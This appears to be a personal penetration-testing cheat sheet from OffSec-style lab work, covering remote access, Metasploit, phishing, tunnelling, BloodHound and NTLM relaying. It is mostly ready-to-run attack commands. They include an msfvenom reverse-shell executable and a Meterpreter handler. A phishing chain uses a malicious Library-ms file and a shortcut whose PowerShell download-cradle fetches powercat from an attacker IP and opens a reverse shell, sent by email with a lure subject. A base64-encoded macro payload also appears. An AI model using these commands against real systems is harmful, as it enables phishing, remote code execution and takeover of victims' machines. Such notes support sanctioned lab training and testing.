---

---
# Remote Connection

--------
## xfreerdp

```bash
xfreerdp /u:<user> /p:'<pass>' /v:<ip> -f -grab-keyboard
```

# Metasploit

-----
## Quick Meterpreter Handler

```bash
msfconsole -q -x 'use exploit/multi/handler;set LHOST tun0;set PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
```

## MSFVenom

**Windows x64 Meterpreter**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > backup.exe
```

# Phishing

--------
## WebDav

**1. Create local handler**

```bash
~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/turtle/offsec/
```

**2. Create config.Library-ms file (change IP)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.247</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

**3. Create shortcut** (change IP)

```js
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.247:8000/powercat.ps1'); powercat -c 192.168.45.247 -p 4444 -e powershell"
```

**4. Transfer to Kali**

```bash
impacket-smbserver share . -smb2support -username admin -password admin
```

**5. Start powercat and netcat listeners on Kali**

```bash
nc -nvlp 4444
python3 -m http.server 8000
```

**(Optional) 6. Send via email**

```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.210.242 --body @body.txt --header "Subject: Very real email please open" --suppress-data -ap
```

## Macro

1. Create Word/Excel-97 compatible doc
2. `view` > `macros`

```powershell
$Text = 'IEX(New-Object System.Net.WebClient).DownloadString("http://192.168.45.193/powercat.ps1");powercat -c 192.168.45.193 -p 443 -e powershell'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText
```

## Tunneling

-------
## Ligolo-ng

**Set up**

```bash
sudo ip tuntap add user turtle mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

**From compromised box**

```js
./agent -connect IP:11601 -ignore-cert
.\agent.exe -connect IP:11601 -ignore-cert
```

**Add route (kali)**

```js
sudo ip route add 192.168.96.0/24 dev ligolo
```

**Add listener (in this case for responder)**

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:445 --tcp
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```
# Bloodhound

-------

**Remote bloodhound**

```bash
dnschef --fakeip <DC IP>
```

```bash
bloodhound-python -c all -u <user> -p '<pass>' -d <domain> -dc <FQDN> -ns 127.0.0.1 --zip --dns-timeout 30
```

> [!info] DNSChef fixes a DNS timeout problem which can occur with bloodhound.py 
> 
> (often occurs when tunneling DNS, idk why)

# Relaying

--------

**Relay to target and execute file**

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.210.242 -e backup.exe
```

> [!info] Look for "SSRF" on Windows machine for potential relay vectors.
> 
> Anywhere you can force a Windows machine to make a connection can potentially be used for relaying. The connection and service type doesn't matter (could be SMB, HTTP, MSSQL etc). Relaying can be used for code execution, priv esc, or info leak, try everything.

# Rustscan

-----

```bash
sudo rustscan <IP> -- -A -sCV -oA <outfile>
```

